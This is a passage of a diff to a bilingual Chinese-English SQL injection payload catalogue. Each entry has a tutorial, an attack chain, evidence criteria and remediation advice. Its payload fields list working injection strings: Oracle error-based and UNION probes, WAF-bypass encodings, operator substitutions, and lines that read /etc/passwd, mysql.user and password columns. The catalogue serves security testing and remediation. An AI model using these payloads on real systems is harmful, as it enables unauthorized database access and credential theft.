+          "payload": "' OR 1=1--\n' OR 1=2--\n' OR 'a'='a\n' OR 'a'='b\n' OR 1=1/*\n' OR 1=2/*\n' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--\n' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--\n' AND 1=utl_inaddr.get_host_address((SELECT instance_name FROM v$instance))--\n' AND 1=utl_inaddr.get_host_address((SELECT ora_database_name FROM dual))--\n' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--\n' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))--\n' AND 1=ctxsys.drithsx.sn(1,(SELECT instance_name FROM v$instance))--\n' AND 1=ctxsys.drithsx.sn(1,(SELECT ora_database_name FROM dual))--\n' AND 1=dbms_utility.get_hash_value((SELECT banner FROM v$version WHERE rownum=1),0,1073741824)--\n' AND 1=dbms_utility.get_hash_value((SELECT user FROM dual),0,1073741824)--\n' AND 1=dbms_utility.get_hash_value((SELECT instance_name FROM v$instance),0,1073741824)--\n' AND 1=dbms_utility.get_hash_value((SELECT ora_database_name FROM dual),0,1073741824)--\n' AND 1=to_number((SELECT banner FROM v$version WHERE rownum=1))--\n' AND 1=to_number((SELECT user FROM dual))--\n' AND 1=to_number((SELECT instance_name FROM v$instance))--\n' AND 1=to_number((SELECT ora_database_name FROM dual))--\n' AND 1=cast((SELECT banner FROM v$version WHERE rownum=1) AS int)--\n' AND 1=cast((SELECT user FROM dual) AS int)--\n' AND 1=cast((SELECT instance_name FROM v$instance) AS int)--\n' AND 1=cast((SELECT ora_database_name FROM dual) AS int)--\n' AND 1=extractvalue(1,concat(0x7e,(SELECT banner FROM v$version WHERE rownum=1)))--\n' AND 1=extractvalue(1,concat(0x7e,(SELECT user FROM dual)))--\n' AND 1=extractvalue(1,concat(0x7e,(SELECT instance_name FROM v$instance)))--\n' AND 1=extractvalue(1,concat(0x7e,(SELECT ora_database_name FROM dual)))--\n' AND 1=updatexml(1,concat(0x7e,(SELECT banner FROM v$version WHERE rownum=1)),1)--\n' AND 1=updatexml(1,concat(0x7e,(SELECT user FROM dual)),1)--\n' AND 1=updatexml(1,concat(0x7e,(SELECT instance_name FROM v$instance)),1)--\n' AND 1=updatexml(1,concat(0x7e,(SELECT ora_database_name FROM dual)),1)--\n' UNION SELECT NULL FROM dual--\n' UNION SELECT NULL,NULL FROM dual--\n' UNION SELECT NULL,NULL,NULL FROM dual--\n' UNION SELECT NULL,NULL,NULL,NULL FROM dual--\n' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual--\n' UNION ALL SELECT NULL FROM dual--\n' UNION ALL SELECT NULL,NULL FROM dual--\n' UNION ALL SELECT NULL,NULL,NULL FROM dual--\n' UNION ALL SELECT NULL,NULL,NULL,NULL FROM dual--\n' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL FROM dual--\n1 UNION SELECT NULL FROM dual\n1 UNION SELECT NULL,NULL FROM dual\n1 UNION SELECT NULL,NULL,NULL FROM dual\n1 UNION SELECT NULL,NULL,NULL,NULL FROM dual\n1 UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual\n1 UNION ALL SELECT NULL FROM dual"
+        },
+        {
+          "title": {
+            "zh": "核对Oracle Database 注入成功证据",
+            "en": "Verify Oracle Database Injection evidence"
+          },
+          "description": {
+            "zh": "最终 SQL 和数据库审计必须显示预期 Oracle 表达式；跨方言语法错误、包未授权或统一 ORA 页面都不能单独确认。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Final SQL and database auditing must show the intended Oracle expression; cross-dialect errors, denied packages, or a generic ORA page do not confirm injection. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归Oracle Database 注入",
+            "en": "Remediate and regress Oracle Database Injection"
+          },
+          "description": {
+            "zh": "使用 Oracle 绑定变量，允许列表映射动态标识符，撤销不必要字典视图、UTL_* 包和网络 ACL，并统一 ORA 错误。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use Oracle bind variables, allowlist dynamic identifiers, revoke unnecessary dictionary, UTL_* package, and network ACL access, and normalize ORA errors. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://docs.oracle.com/en/database/oracle/oracle-database/23/lnpls/sql-injection.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "核心是 Oracle SQL 注入载荷；已明确隔离跨方言残留。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-awesome-waf",
+      "prerequisites": [
+        {
+          "zh": "先逐行标注 DBMS、编码层、证据通道和潜在影响，不把混合语料作为一条可直接执行的测试。",
+          "en": "First classify every line by DBMS, encoding layer, evidence channel, and potential impact; do not treat the mixed corpus as one executable test."
+        },
+        {
+          "zh": "为 UNION、盲注、目录访问和文件写入片段分别匹配已有目标卡及其独立测试环境，无法归类的行保持隔离。",
+          "en": "Map UNION, blind, catalog-access, and file-write fragments to existing target cards and separate test environments, keeping unclassified lines isolated."
+        }
+      ],
+      "analysis": {
+        "zh": "本条的阳性结果是拆分审校本身：每个片段都能被归入正确的 DBMS、解码顺序、影响等级和既有路由目标，并在目标卡中使用相应的真/假或固定标记证据。整块被 WAF 命中、某一行报语法错、编码后返回 200 或跨方言函数失败，都不能证明该混合集合可作为单一 Payload。",
+        "en": "The positive result for this entry is the split review itself: every fragment is assigned the correct DBMS, decoding order, impact level, and existing route, with the target card applying its own paired or fixed-marker evidence. A WAF hit on the block, one syntax error, HTTP 200 after encoding, or failure of a cross-dialect function does not prove that the mixed corpus is a single usable payload."
+      },
+      "opsecTips": [
+        {
+          "zh": "审校遇到 OUTFILE、目录枚举或其他高影响片段时停止于分类，不在混合语料上下文中执行。",
+          "en": "Stop at classification when review reaches OUTFILE, catalog enumeration, or another high-impact fragment; do not execute it in the mixed-corpus context."
+        },
+        {
+          "zh": "删除拆分过程中建立的临时数据和编码样本，撤销文件系统测试权限，并清理未采用的分类草稿。",
+          "en": "Delete temporary data and encoding samples created during splitting, revoke filesystem test privileges, and clear discarded classification drafts."
+        }
+      ],
+      "name": {
+        "zh": "跨方言 SQL/WAF 混合集（待拆分）",
+        "en": "Mixed SQL/WAF Corpus (Split Required)"
+      },
+      "description": {
+        "zh": "混合 MySQL、Oracle、SQLite、Access 风格语句、URL/XML 编码与文件写入影响，无法用单一前置条件解释。",
+        "en": "Mixes MySQL, Oracle, SQLite, Access-style statements, URL/XML encodings, and file-write impact that cannot share one prerequisite model."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "混合 SQL/WAF 语料拆分",
+        "en": "Mixed SQL/WAF Corpus Split"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "跨方言 SQL/WAF 混合集（待拆分）聚焦逐行审查发现 UNION、盲注、注释混淆、XML 包装、双重编码、目录访问和 OUTFILE；单卡会掩盖 DBMS 与解析层条件。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Mixed SQL/WAF Corpus (Split Required) focuses on this boundary: Line review found UNION, blind predicates, comment confusion, XML wrapping, double encoding, catalog access, and OUTFILE, whose DBMS and parsing prerequisites cannot fit one card. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "每行只在特定数据库、字符集、解码顺序和查询上下文中成立；WAF 接受但后端语法失败不是绕过。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Each line works only under a specific database, charset, decoding order, and query context; passing a WAF while failing backend syntax is not bypass. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "逐行标注方言、编码层、技术和预期证据，再分别路由到 UNION、报错、Oracle、SQLite、规范化或堆叠影响卡。 每个子集都要对比原始字节、WAF 日志、应用解码值和最终 SQL；禁止把整块语料一次发送并以状态码定性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Label each line by dialect, encoding layer, technique, and expected evidence, then route it to UNION, error, Oracle, SQLite, normalization, or stacked-impact cards. For each subset compare raw bytes, WAF logs, application-decoded values, and final SQL; never submit the entire corpus or classify by status code. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "在单一入口严格解码和规范化，再做类型校验与参数绑定；按 DBMS 限制目录和文件写权限，WAF 仅作纵深检测。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Decode and canonicalize once, then validate types and bind parameters; restrict catalog and file-write privileges by DBMS and use the WAF only as defense in depth. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "expert"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认混合 SQL/WAF 语料拆分前置条件",
+            "en": "Confirm Mixed SQL/WAF Corpus Split prerequisites"
+          },
+          "description": {
+            "zh": "逐行审查发现 UNION、盲注、注释混淆、XML 包装、双重编码、目录访问和 OUTFILE；单卡会掩盖 DBMS 与解析层条件。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Line review found UNION, blind predicates, comment confusion, XML wrapping, double encoding, catalog access, and OUTFILE, whose DBMS and parsing prerequisites cannot fit one card. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控混合 SQL/WAF 语料拆分探针",
+            "en": "Run a controlled Mixed SQL/WAF Corpus Split probe"
+          },
+          "description": {
+            "zh": "逐行标注方言、编码层、技术和预期证据，再分别路由到 UNION、报错、Oracle、SQLite、规范化或堆叠影响卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Label each line by dialect, encoding layer, technique, and expected evidence, then route it to UNION, error, Oracle, SQLite, normalization, or stacked-impact cards. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "id2='union all select * from users--\nSELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);\n1%0b||%0bLPAD(USER,7,1)\n%C0%80'+union+select+col1,col2,col3+from+table+--+\n\"; select * from TARGET_TABLE --\n<string>’ union select current_user, 2#</string>\n0 union/**/select 1,version(),@@datadir\nstate=%2527+and+\n(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+\nBENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+\n0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user\n1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')\n1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-\namUserId=1 union select username,password,3,4 from users\n%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201\n1%0bAND(SELECT%0b1%20FROM%20mysql.x)\n%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29\n%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201\n15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'\nstringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1"
+        },
+        {
+          "title": {
+            "zh": "核对混合 SQL/WAF 语料拆分成功证据",
+            "en": "Verify Mixed SQL/WAF Corpus Split evidence"
+          },
+          "description": {
+            "zh": "每个子集都要对比原始字节、WAF 日志、应用解码值和最终 SQL；禁止把整块语料一次发送并以状态码定性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "For each subset compare raw bytes, WAF logs, application-decoded values, and final SQL; never submit the entire corpus or classify by status code. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归混合 SQL/WAF 语料拆分",
+            "en": "Remediate and regress Mixed SQL/WAF Corpus Split"
+          },
+          "description": {
+            "zh": "在单一入口严格解码和规范化，再做类型校验与参数绑定；按 DBMS 限制目录和文件写权限，WAF 仅作纵深检测。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Decode and canonicalize once, then validate types and bind parameters; restrict catalog and file-write privileges by DBMS and use the WAF only as defense in depth. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+        "https://coreruleset.org/docs/concepts/false_positives_tuning/"
+      ],
+      "review": {
+        "decision": "split",
+        "rationale": "原记录跨 DBMS、编码层和影响，必须拆到已有具体 Payload，而不是迁入单一工具。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-category",
+          "reviewed-command-dialects",
+          "documented-split",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references"
+        ],
+        "targetPayloadIds": [
+          "sqli2-union-extraction-lexical-encodings",
+          "sqli2-union-crlf-comment-encoding",
+          "sqli2-wordpress-url-wrapped-union-query",
+          "sqli2-blind-conditional-time-and-predicate-probes",
+          "sqli2-direct-statement-and-catalog-selection",
+          "sqli2-outfile-write-primitive"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-like-between-in",
+      "prerequisites": [
+        {
+          "zh": "先用参数化日志确认现有注入点，再记录目标 DBMS 中 LIKE、BETWEEN、IN 的类型转换、排序规则和边界语义。",
+          "en": "First confirm the existing injection point through parameterized logging, then record the target DBMS's coercion, collation, and boundary semantics for LIKE, BETWEEN, and IN."
+        },
+        {
+          "zh": "为每种替代运算符构造结构相同的恒真与恒假谓词，并保留使用等号的规范版本作为过滤对照。",
+          "en": "Build structurally matched true and false predicates for each substitute operator, retaining the canonical equality form as a filtering control."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求替代运算符到达后端并使恒真、恒假结果稳定分离；若声称绕过过滤，还必须证明等号版本被拦截而语义等价的替代形式执行。因通配符、排序规则、NULL 或边界包含规则造成的正常行数差异，单纯语法错误或输入回显均是假阳性。",
+        "en": "A positive result requires the substitute operator to reach the backend and reproducibly separate matched true and false outcomes. A filtering-bypass claim also requires the equality form to be blocked while the equivalent substitute executes. Normal row-count differences caused by wildcards, collation, NULL, or inclusive boundaries, plus syntax errors or input reflection, are false positives."
+      },
+      "opsecTips": [
+        {
+          "zh": "确认一个运算符的配对差异后停止，不继续组合多个运算符或扩大到目录查询。",
+          "en": "Stop after confirming the paired differential for one operator; do not combine multiple operators or expand into catalog queries."
+        },
+        {
+          "zh": "回滚用于比较的测试行，清除查询缓存和临时 WAF 例外，并恢复原排序规则与参数校验。",
+          "en": "Roll back comparison rows, clear query caches and temporary WAF exceptions, and restore the original collation and parameter validation."
+        }
+      ],
+      "name": {
+        "zh": "比较运算符替代注入",
+        "en": "Comparison-Operator Substitution Injection"
+      },
+      "description": {
+        "zh": "用 LIKE、BETWEEN 和 IN 替代等号构造等价真值条件，验证防护是否只做表面运算符匹配。",
+        "en": "Uses LIKE, BETWEEN, and IN instead of equality to create equivalent true predicates and test superficial operator filtering."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "LIKE/BETWEEN/IN 运算符替代",
+        "en": "LIKE/BETWEEN/IN Operator Substitution"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "比较运算符替代注入聚焦这是已确认注入点上的比较运算符变体，不是独立漏洞类型；每种运算符都必须与结构相同的真假条件配对。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Comparison-Operator Substitution Injection focuses on this boundary: This is a comparison-operator variation for an existing injection point, not a separate flaw; pair each operator with structurally identical true and false conditions. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "应用继续拼接 SQL，却只在黑名单中删除等号，数据库支持的其他比较运算符仍可维持相同布尔语义。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "The application still concatenates SQL while a blacklist removes equality, leaving other database-supported comparison operators able to preserve Boolean semantics. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先用等号真假条件建立基线，再只替换为 LIKE、BETWEEN 或 IN，保持引号、空白和其他请求字节不变。 最终数据库谓词和业务记录集合必须呈现等价真假结果；WAF 状态变化、智能引号解析失败或普通错误均不是证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Establish an equality true/false baseline, then replace only the operator with LIKE, BETWEEN, or IN while preserving quotes, whitespace, and all other bytes. The final database predicate and business record set must show equivalent true/false behavior; WAF status changes, smart-quote failures, and generic errors are not evidence. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用参数化查询与严格类型绑定，不扩充运算符黑名单；统一字符集规范化，并用全部等价运算符回归测试。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use parameterized queries and strict typing rather than expanding an operator blacklist, canonicalize character encoding, and regress all equivalent operators. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "intermediate"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认LIKE/BETWEEN/IN 运算符替代前置条件",
+            "en": "Confirm LIKE/BETWEEN/IN Operator Substitution prerequisites"
+          },
+          "description": {
+            "zh": "这是已确认注入点上的比较运算符变体，不是独立漏洞类型；每种运算符都必须与结构相同的真假条件配对。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "This is a comparison-operator variation for an existing injection point, not a separate flaw; pair each operator with structurally identical true and false conditions. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控LIKE/BETWEEN/IN 运算符替代探针",
+            "en": "Run a controlled LIKE/BETWEEN/IN Operator Substitution probe"
+          },
+          "description": {
+            "zh": "先用等号真假条件建立基线，再只替换为 LIKE、BETWEEN 或 IN，保持引号、空白和其他请求字节不变。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Establish an equality true/false baseline, then replace only the operator with LIKE, BETWEEN, or IN while preserving quotes, whitespace, and all other bytes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ AND 1 LIKE 1--\n1’ AND 1 BETWEEN 0 AND 2--\n1’ AND 1 IN (1)--\n1’ AND ‘a’ LIKE ‘a’--\n1’ AND ‘a’ BETWEEN ‘a’ AND ‘b’--\n1’ AND ‘a’ IN (‘a’,’b’,’c’)--\n1’ OR 1 LIKE 1--\n1’ OR 1 BETWEEN 0 AND 2--\n1’ OR ‘a’ LIKE ‘a’--"
+        },
+        {
+          "title": {
+            "zh": "核对LIKE/BETWEEN/IN 运算符替代成功证据",
+            "en": "Verify LIKE/BETWEEN/IN Operator Substitution evidence"
+          },
+          "description": {
+            "zh": "最终数据库谓词和业务记录集合必须呈现等价真假结果；WAF 状态变化、智能引号解析失败或普通错误均不是证据。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "The final database predicate and business record set must show equivalent true/false behavior; WAF status changes, smart-quote failures, and generic errors are not evidence. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归LIKE/BETWEEN/IN 运算符替代",
+            "en": "Remediate and regress LIKE/BETWEEN/IN Operator Substitution"
+          },
+          "description": {
+            "zh": "使用参数化查询与严格类型绑定，不扩充运算符黑名单；统一字符集规范化，并用全部等价运算符回归测试。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use parameterized queries and strict typing rather than expanding an operator blacklist, canonicalize character encoding, and regress all equivalent operators. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这些是 SQL 运算符替代载荷，不是字典工具命令。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-and-or",
+      "prerequisites": [
+        {
+          "zh": "在 WAF、框架和数据库入口分别捕获原始字节与规范化值，明确百分号解码和关键字清洗的先后顺序。",
+          "en": "Capture raw bytes and normalized values at the WAF, framework, and database boundaries, documenting percent-decoding and keyword-cleaning order."
+        },
+        {
+          "zh": "确认目标方言对 &&、|| 的真实含义，并为每个编码或重叠关键字形式准备语义一致的恒真、恒假对照。",
+          "en": "Confirm the target dialect's actual semantics for && and ||, and prepare semantically matched true and false controls for every encoded or overlapping-keyword form."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性证据是入口层接受某个变体，后续规范化把它重建成逻辑运算符，并在数据库中产生可重复的真/假结果差异；绕过结论还需规范写法被同一策略拦截。WAF 日志出现字符串、`||` 被解释为连接、清洗后语法错误、或页面仅回显编码值都不是阳性。",
+        "en": "Positive evidence is an entry layer accepting a variant, later normalization reconstructing a logical operator, and the database producing a repeatable true/false differential; a bypass claim also requires the canonical form to be blocked by the same policy. A string appearing in WAF logs, || acting as concatenation, a syntax error after cleaning, or reflection of an encoded value is not positive evidence."
+      },
+      "opsecTips": [
+        {
+          "zh": "定位到第一个发生语义重建的层和一个稳定差异后停止，不叠加双重编码或其他注入原语。",
+          "en": "Stop after locating the first layer that reconstructs semantics and one stable differential; do not add double encoding or other injection primitives."
+        },
+        {
+          "zh": "移除临时原始请求捕获，清除解码缓存和测试规则，并把各层恢复为统一的单次规范化流程。",
+          "en": "Remove temporary raw-request capture, clear decoder caches and test rules, and restore a consistent single-normalization flow across layers."
+        }
+      ],
+      "name": {
+        "zh": "逻辑运算符编码与关键词变体",
+        "en": "Logical-Operator Encoding and Keyword Variants"
+      },
+      "description": {
+        "zh": "使用 AND/OR 的符号形式、URL 编码和关键词重叠变体，验证过滤器与数据库规范化是否一致。",
+        "en": "Uses symbolic, URL-encoded, and overlapping-keyword forms of AND and OR to test consistent normalization between filters and the database."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "AND/OR 规范化绕过",
+        "en": "AND/OR Normalization Bypass"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "逻辑运算符编码与关键词变体聚焦集合覆盖 &&、||、百分号编码和删除关键词后可能重新拼成关键字的重叠写法；核心证据是后端谓词。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Logical-Operator Encoding and Keyword Variants focuses on this boundary: The set covers &&, ||, percent encoding, and overlapping keywords that may re-form after filtering; the backend predicate is the key evidence. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "黑名单若在解码前匹配、只删除一次关键词或忽略数据库 SQL 模式，可能把输入转换成有效逻辑运算符。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "A blacklist that matches before decoding, removes a keyword once, or ignores SQL mode can transform input into a valid logical operator. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先用标准 AND/OR 真值对确认注入，再一次只替换一种符号、编码或重叠形式，并记录每层解码值。 WAF、应用和数据库日志必须共同证明变体被规范化为预期谓词并改变实际记录；通用拦截页不算。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Confirm injection with standard AND/OR controls, then replace one symbolic, encoded, or overlapping form at a time and record decoding at every layer. WAF, application, and database logs must show normalization into the intended predicate and a changed record set; a generic block page is insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "在应用边界只解码一次，拒绝非规范编码，执行类型校验与参数绑定，禁止关键词删除式过滤。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Decode once at the application boundary, reject non-canonical encoding, validate types, bind parameters, and avoid keyword-removal filters. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "intermediate"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认AND/OR 规范化绕过前置条件",
+            "en": "Confirm AND/OR Normalization Bypass prerequisites"
+          },
+          "description": {
+            "zh": "集合覆盖 &&、||、百分号编码和删除关键词后可能重新拼成关键字的重叠写法；核心证据是后端谓词。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "The set covers &&, ||, percent encoding, and overlapping keywords that may re-form after filtering; the backend predicate is the key evidence. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控AND/OR 规范化绕过探针",
+            "en": "Run a controlled AND/OR Normalization Bypass probe"
+          },
+          "description": {
+            "zh": "先用标准 AND/OR 真值对确认注入，再一次只替换一种符号、编码或重叠形式，并记录每层解码值。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Confirm injection with standard AND/OR controls, then replace one symbolic, encoded, or overlapping form at a time and record decoding at every layer. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "1’ %26%26 1=1--\n1’ || 1=1--\n1’ && 1=1--\n1’ %7C%7C 1=1--\n1’ anandd 1=1--\n1’ oorr 1=1--\n1’ aANDnd 1=1--\n1’ oORr 1=1--"
+        },
+        {
+          "title": {
+            "zh": "核对AND/OR 规范化绕过成功证据",
+            "en": "Verify AND/OR Normalization Bypass evidence"
+          },
+          "description": {
+            "zh": "WAF、应用和数据库日志必须共同证明变体被规范化为预期谓词并改变实际记录；通用拦截页不算。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "WAF, application, and database logs must show normalization into the intended predicate and a changed record set; a generic block page is insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归AND/OR 规范化绕过",
+            "en": "Remediate and regress AND/OR Normalization Bypass"
+          },
+          "description": {
+            "zh": "在应用边界只解码一次，拒绝非规范编码，执行类型校验与参数绑定，禁止关键词删除式过滤。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Decode once at the application boundary, reject non-canonical encoding, validate types, bind parameters, and avoid keyword-removal filters. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "内容是逻辑运算符规范化验证载荷，应保留在 SQL 注入分类。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-limit",
+      "prerequisites": [
+        {
+          "zh": "确认具体 DBMS 的 LIMIT/OFFSET 或 FETCH 语法，以及用户参数是否被拼接到分页子句而非正常绑定。",
+          "en": "Confirm the DBMS-specific LIMIT/OFFSET or FETCH syntax and whether user input is concatenated into the pagination clause rather than normally bound."
+        },
+        {
+          "zh": "在具有固定排序的测试表中准备编号标记行，并保存应用合法分页 API 对相同数据集的基线窗口。",
+          "en": "Prepare numbered marker rows in a test table with deterministic ordering, and retain the application's legitimate pagination baseline for the same dataset."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性是输入改变了后端分页子句，使返回窗口与固定标记行和 SQL 审计完全对应，且超出该参数正常允许的页码或大小语义。正常分页功能、未固定排序导致的行漂移、缓存命中、语法错误或不同方言拒绝 FETCH 不是注入证明。",
